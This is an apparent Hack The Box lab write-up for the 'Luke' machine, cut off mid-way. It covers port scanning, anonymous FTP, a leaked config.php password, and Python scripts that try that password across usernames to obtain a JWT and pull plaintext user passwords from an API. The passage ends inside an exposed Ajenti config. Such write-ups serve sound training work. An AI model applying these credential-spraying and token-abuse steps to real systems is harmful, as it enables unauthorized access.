@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    <meta property="og:image" content="http://localhost:4000/boxes/screenshots/28_luke/luke.png" />
+    
+    
+    <meta property="og:title" content="HTB Luke" />
+    
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB Luke | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="HTB Luke" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="10.10.10.137 30 pts" />
+<meta property="og:description" content="10.10.10.137 30 pts" />
+<link rel="canonical" href="http://localhost:4000/boxes/28_Luke.html" />
+<meta property="og:url" content="http://localhost:4000/boxes/28_Luke.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"@type":"WebPage","url":"http://localhost:4000/boxes/28_Luke.html","headline":"HTB Luke","description":"10.10.10.137 30 pts","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+ 
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>jebidiah-anthony</h1>
+        <h2>write-ups and what not</h2>
+
+	<span>
+	  <a href="/">whoami</a> | 
+          <a href="/htb.html">htb writeups</a> | 
+	  <a href="/ctf.html">ctf writeups</a> | 
+	  <a href="/projects.html">projects</a> 
+	</span>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="htb-luke-101010137-machine-write-up">HTB LUKE (10.10.10.137) MACHINE WRITE-UP</h1>
+
+<h3 id="table-of-contents">TABLE OF CONTENTS</h3>
+
+<ul>
+  <li><a href="#port-1--initial-recon">PORT 1 : INITIAL RECON</a></li>
+  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
+    <ul>
+      <li><a href="#port-21-ftp">PORT 21 (ftp)</a></li>
+      <li><a href="#port-80-http">PORT 80 (http)</a></li>
+      <li><a href="#port-3000-http">PORT 3000 (http)</a></li>
+      <li><a href="#port-8000-http">PORT 8000 (http)</a></li>
+    </ul>
+  </li>
+  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
+  <li><a href="#part-4--generate-a-root-shell">PART 4 : GENERATE A ROOT SHELL</a></li>
+</ul>
+
+<hr />
+
+<h2 id="port-1--initial-recon">PORT 1 : INITIAL RECON</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 700 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.137
+<span class="go">
+  PORT     STATE SERVICE
+  21/tcp   open  ftp
+  22/tcp   open  ssh
+  80/tcp   open  http
+  3000/tcp open  ppp
+  8000/tcp open  http-alt
+
+</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,22,80,3000,8000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.137
+<span class="go">
+  PORT     STATE SERVICE VERSION
+  21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  |_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+  | ftp-syst: 
+  |   STAT: 
+  | FTP server status:
+  |      Connected to 10.10.14.140
+  |      Logged in as ftp
+  |      TYPE: ASCII
+  |      No session upload bandwidth limit
+  |      No session download bandwidth limit
+  |      Session timeout in seconds is 300
+  |      Control connection is plain text
+  |      Data connections will be plain text
+  |      At session startup, client count was 3
+  |      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+  |_End of status
+  22/tcp   open  ssh?
+  80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+  | http-methods: 
+  |   Supported Methods: HEAD GET POST OPTIONS TRACE
+  |_  Potentially risky methods: TRACE
+  |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+  |_http-title: Luke
+  3000/tcp open  http    Node.js Express framework
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+</span><span class="gp">  |_http-title: Site doesn't have a title (application/json;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
+<span class="go">  8000/tcp open  http    Ajenti http control panel
+  | http-methods: 
+  |_  Supported Methods: GET POST OPTIONS
+  |_http-title: Ajenti
+
+</span></code></pre></div></div>
+
+<hr />
+
+<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>
+
+<h3 id="port-21-ftp">PORT 21 (ftp)</h3>
+
+<ol>
+  <li>Login to the <strong>ftp</strong> service as <code class="highlighter-rouge">anonymous</code>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ftp 10.10.10.137
+<span class="c">  ...
+</span><span class="gp">$</span><span class="w"> </span>Name <span class="o">(</span>10.10.10.137:jebidiah<span class="o">)</span>: anonymous
+<span class="gp">$</span><span class="w"> </span>Password: _
+<span class="go">  230 Login successful.
+</span></code></pre></div>    </div>
+  </li>
+  <li>List the files inside the service:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+<span class="c">  ...
+</span><span class="go">  drwxr-xr-x    3 0        0             512 Apr 14 12:29 .
+  drwxr-xr-x    3 0        0             512 Apr 14 12:29 ..
+  drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+</span><span class="c">  ...
+</span><span class="gp">$</span><span class="w"> </span>ftp&gt; <span class="nb">cd </span>webapp
+<span class="c">  ...
+</span><span class="gp">$</span><span class="w"> </span>ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+<span class="c">  ...
+</span><span class="go">  drwxr-xr-x    2 0        0             512 Apr 14 12:35 .
+  drwxr-xr-x    3 0        0             512 Apr 14 12:29 ..
+  -r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
+</span><span class="c">  ...
+</span><span class="gp">$</span><span class="w"> </span>ftp&gt; get for_Chihiro.txt
+<span class="c">  ...
+</span><span class="gp">$</span><span class="w"> </span>ftp&gt; <span class="nb">exit</span>
+</code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li>Anonymous login was allowed according to the nmap scan</li>
+      <li><code class="highlighter-rouge">for_Chihiro.txt</code>:
+        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dear Chihiro !!
+      
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
+      
+Derry 
+</code></pre></div>        </div>
+        <ul>
+          <li>This box seems to involve a lot of web services (… hopefully vulnerable)</li>
+        </ul>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<h3 id="port-80-http">PORT 80 (http)</h3>
+
+<ol>
+  <li>
+    <p>View <code class="highlighter-rouge">http://10.10.10.137/</code>:</p>
+
+    <p><img src="./screenshots/28_luke/80_landing_page.png" alt="http://10.10.10.137/" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li>The homepage is a static html file (index.html)</li>
+    </ol>
+  </li>
+  <li>
+    <p>Running <code class="highlighter-rouge">gobuster</code> on the service:</p>
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.137 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
+<span class="go">  ...omitted...     
+  /login.php (Status: 200)
+  /member (Status: 301)
+  /management (Status: 401)
+  /css (Status: 301)
+  /js (Status: 301)
+  /vendor (Status: 301)
+  /config.php (Status: 200)
+  /LICENSE (Status: 200)
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li><code class="highlighter-rouge">/member</code>:
+        <ul>
+          <li>A blank page is returned when visited.</li>
+        </ul>
+      </li>
+      <li><code class="highlighter-rouge">/management</code>:
+        <ul>
+          <li>The page requires successful <strong>http authentication</strong> for access.</li>
+        </ul>
+      </li>
+      <li><code class="highlighter-rouge">/config.php</code>:
+        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+<span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
+<span class="nv">$dbPassword</span>  <span class="o">=</span> <span class="s1">'Zk6heYCyv6ZE9Xcg'</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"login"</span><span class="p">;</span>
+
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span> <span class="nv">$dbUsername</span><span class="p">,</span> <span class="nv">$dbPassword</span><span class="p">,</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Connect failed: %s</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span> <span class="nv">$conn</span> <span class="o">-&gt;</span> <span class="na">error</span><span class="p">);</span> 
+</code></pre></div>        </div>
+        <ul>
+          <li>The PHP code might have been intentionally left to be viewable since the server is running apache and the page’s file extension is <code class="highlighter-rouge">.php</code>.</li>
+          <li>A credential pair is revealed – <code class="highlighter-rouge">root : Zk6heYCyv6ZE9Xcg</code></li>
+        </ul>
+      </li>
+      <li><code class="highlighter-rouge">/login.php</code>:
+        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">name=</span><span class="s">"Login_Form"</span> <span class="na">class=</span><span class="s">"form-signin"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"form-signin-heading"</span><span class="nt">&gt;</span>Please sign in (beta version )<span class="nt">&lt;/h2&gt;</span>
+    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputUsername"</span> <span class="na">class=</span><span class="s">"sr-only"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"Username"</span> <span class="na">type=</span><span class="s">"username"</span> <span class="na">id=</span><span class="s">"inputUsername"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Username"</span> <span class="na">required</span> <span class="na">autofocus</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputPassword"</span> <span class="na">class=</span><span class="s">"sr-only"</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"Password"</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">id=</span><span class="s">"inputPassword"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Password"</span> <span class="na">required</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"checkbox"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;label&gt;</span>
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">value=</span><span class="s">"remember-me"</span><span class="nt">&gt;</span> Remember me
+        <span class="nt">&lt;/label&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;button</span> <span class="na">name=</span><span class="s">"Submit"</span> <span class="na">value=</span><span class="s">"Login"</span> <span class="na">class=</span><span class="s">"btn btn-lg btn-primary btn-block"</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Sign in<span class="nt">&lt;/button&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div>        </div>
+      </li>
+      <li>Loggin in on <code class="highlighter-rouge">/login.php</code> and <code class="highlighter-rouge">/management</code> using the credentials from <code class="highlighter-rouge">config.php</code> failed.
+        <ul>
+          <li>The same results occur even after using the password with the usernames: <code class="highlighter-rouge">Chihiro</code>, <code class="highlighter-rouge">Derry</code>, <code class="highlighter-rouge">admin</code>, and <code class="highlighter-rouge">administrator</code>.</li>
+        </ul>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<h3 id="port-3000-http">PORT 3000 (http)</h3>
+
+<ol>
+  <li>View <code class="highlighter-rouge">http://10.10.10.137:3000</code>:
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"success"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Auth token is not supplied"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li>Only JSON data was returned.</li>
+      <li>Authentication might be done using a <strong>JSON Web Token (JWT)</strong>.</li>
+    </ol>
+  </li>
+  <li>Running <code class="highlighter-rouge">gobuster</code> on the service:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.137:3000 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+<span class="go">  ...omitted...
+  /login (Status: 200)
+  /users (Status: 200) 
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li><code class="highlighter-rouge">/login</code>:
+        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"please auth"</span><span class="w">
+</span></code></pre></div>        </div>
+      </li>
+      <li><code class="highlighter-rouge">/users</code>:
+        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"success"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Auth token is not supplied"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div>        </div>
+      </li>
+      <li>Perhaps nothing could be done to this service unless authenticated.</li>
+    </ol>
+  </li>
+</ol>
+
+<h3 id="port-8000-http">PORT 8000 (http)</h3>
+
+<ol>
+  <li>
+    <p>View <code class="highlighter-rouge">http://10.10.10.137:8000</code>:</p>
+
+    <p><img src="./screenshots/28_luke/8000_login.png" alt="http://10.10.10.137:8000/" /></p>
+
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li>An <strong>Ajenti</strong> service is running on this port.</li>
+      <li>Logging in using the known password and assumed usernames returned <code class="highlighter-rouge">Invalid login or password</code>.</li>
+    </ol>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>
+
+<ol>
+  <li>Generate a JWT (JSON Web Token) for the service running on port 3000:
+    <ol>
+      <li><code class="highlighter-rouge">token_search.py</code>:
+        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s">"http://10.10.10.137:3000"</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span> <span class="p">}</span>
+
+<span class="n">usernames</span> <span class="o">=</span> <span class="p">[</span><span class="s">"root"</span><span class="p">,</span> <span class="s">"chihiro"</span><span class="p">,</span> <span class="s">"derry"</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">,</span> <span class="s">"administrator"</span><span class="p">,</span> <span class="s">"Chihiro"</span><span class="p">,</span> <span class="s">"Derry"</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">usernames</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"username"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+        <span class="s">"password"</span><span class="p">:</span> <span class="s">"Zk6heYCyv6ZE9Xcg"</span>
+    <span class="p">}</span>
+    <span class="n">auth</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="s">"/login"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">"Forbidden"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">auth</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> 
+        <span class="k">print</span><span class="p">(</span><span class="s">"[JWT FOUND]</span><span class="se">\n\n</span><span class="s">USERNAME:"</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">TOKEN:"</span><span class="p">,</span> <span class="n">auth</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s">"token"</span><span class="p">])</span>
+        <span class="k">break</span>
+</code></pre></div>        </div>
+      </li>
+      <li>Running <code class="highlighter-rouge">token_search.py</code> using <code class="highlighter-rouge">python3</code>:
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 token_search.py
+<span class="go">  [JWT FOUND]
+        
+  USERNAME: admin
+        
+  TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY2ODU2MTM0LCJleHAiOjE1NjY5NDI1MzR9.b0u3Mb8h0GPSsIRGOiWYqHH1QANE1ogY_HFCfjskvGQ
+</span></code></pre></div>        </div>
+        <p><strong>NOTE(S)</strong>:</p>
+        <ol>
+          <li>The password from <code class="highlighter-rouge">config.php</code> earlier authenticated the user, <code class="highlighter-rouge">admin</code>.</li>
+          <li>A valid token is now available for use.
+            <ul>
+              <li>The token changes everytime a user is authenticated.
+                <blockquote>
+
+                </blockquote>
+              </li>
+            </ul>
+          </li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+  <li>Enumerate the service on port 3000 using an authenticated session:
+    <ol>
+      <li><code class="highlighter-rouge">3000.py</code>:
+        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s">"http://10.10.10.137:3000"</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+      
+<span class="c1"># ===EXTRACTING-THE-JSON-WEBTOKEN===================================
+</span>      
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span> <span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+    <span class="s">"password"</span><span class="p">:</span> <span class="s">"Zk6heYCyv6ZE9Xcg"</span>
+<span class="p">}</span>
+<span class="n">login</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="s">"/login"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">login</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s">"token"</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[JSON WEB TOKEN]</span><span class="se">\n\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">token</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">NO TOKEN FOUND</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="nb">exit</span><span class="p">()</span>
+      
+<span class="c1"># ===AUTHENTICATION-AND-ENUMERATION-ON-PORT-3000====================
+</span>      
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">,</span>
+    <span class="s">"Authorization"</span><span class="p">:</span> <span class="s">"Bearer "</span> <span class="o">+</span> <span class="n">token</span>
+<span class="p">}</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[HTTP GET REQUESTS @ 10.10.10.137:3000]</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">get</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"GET /"</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">users</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="s">"/"</span><span class="o">+</span><span class="n">get</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+              
+        <span class="n">switch</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">"&lt;class 'str'&gt;"</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s">"   "</span><span class="p">,</span> <span class="n">x</span><span class="p">),</span>
+            <span class="s">"&lt;class 'dict'&gt;"</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s">"   "</span><span class="p">,</span> <span class="n">x</span><span class="p">),</span>
+            <span class="s">"&lt;class 'list'&gt;"</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="k">print</span><span class="p">(</span><span class="s">"   "</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
+        <span class="p">}</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">users</span><span class="o">.</span><span class="n">json</span><span class="p">()))]</span> <span class="p">(</span><span class="n">users</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"    Cannot GET /"</span><span class="o">+</span> <span class="n">get</span><span class="p">)</span>
+</code></pre></div>        </div>
+      </li>
+      <li>Running <code class="highlighter-rouge">3000.py</code> using <code class="highlighter-rouge">python3</code>:
+        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 3000.py
+<span class="go">   
+  [JSON WEB TOKEN]
+
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY2ODU3MTYyLCJleHAiOjE1NjY5NDM1NjJ9.WjGYaDQUci24PMrAmK4Hmqx68rDu6Bn_QF-vk5jGIUw
+
+  [HTTP GET REQUESTS @ 10.10.10.137:3000]
+
+</span><span class="gp">$</span><span class="w"> </span>GET /
+<span class="go">      {'message': 'Welcome admin ! '}
+</span><span class="gp">$</span><span class="w"> </span>GET /login
+<span class="go">      please auth
+</span><span class="gp">$</span><span class="w"> </span>GET /users
+<span class="go">      {'ID': '1', 'name': 'Admin', 'Role': 'Superuser'}
+      {'ID': '2', 'name': 'Derry', 'Role': 'Web Admin'}
+      {'ID': '3', 'name': 'Yuri', 'Role': 'Beta Tester'}
+      {'ID': '4', 'name': 'Dory', 'Role': 'Supporter'}
+</span><span class="gp">$</span><span class="w"> </span>GET /users/admin
+<span class="gp">      {'name': 'Admin', 'password': 'WX5b7)&gt;</span>/rp<span class="nv">$U</span><span class="o">)</span>FW<span class="s1">'}
+</span><span class="gp">$</span><span class="w"> </span><span class="s1">GET /users/derry
+</span><span class="go">      {'name': 'Derry', 'password': 'rZ86wwLvx7jUxtch'}
+</span><span class="gp">$</span><span class="w"> </span>GET /users/yuri
+<span class="go">      {'name': 'Yuri', 'password': 'bet@tester87'}
+</span><span class="gp">$</span><span class="w"> </span>GET /users/dory
+<span class="go">      {'name': 'Dory', 'password': '5y:!xa=ybfe)/QD'}
+</span><span class="gp">$</span><span class="w"> </span>GET /^C
+</code></pre></div>        </div>
+      </li>
+    </ol>
+  </li>
+  <li>Attempt to login back at <code class="highlighter-rouge">http://10.10.10.137/management</code>:
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Index of /management<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;ul&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span> Parent Directory<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"config.json"</span><span class="nt">&gt;</span> config.json<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"config.php"</span><span class="nt">&gt;</span> config.php<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"login.php"</span><span class="nt">&gt;</span> login.php<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+<span class="nt">&lt;/ul&gt;</span>
+</code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ol>
+      <li>Login was successful using <code class="highlighter-rouge">Derry:rZ86wwLvx7jUxtch</code></li>
+      <li><code class="highlighter-rouge">config.json</code> is an <strong>Ajenti</strong> config file:
+        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"users"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"root"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"configs"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"ajenti.plugins.notepad.notepad.Notepad"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">bookmarks</span><span class="se">\"</span><span class="s2">: [], </span><span class="se">\"</span><span class="s2">root</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">/</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.terminal.main.Terminals"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">shell</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">sh -c $SHELL || sh</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.elements.ipmap.ElementsIPMapper"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">users</span><span class="se">\"</span><span class="s2">: {}}"</span><span class="p">,</span><span class="w"> 
+                </span><span class="nl">"ajenti.plugins.munin.client.MuninClient"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">prefix</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">http://localhost:8080/munin</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">123</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w"> 
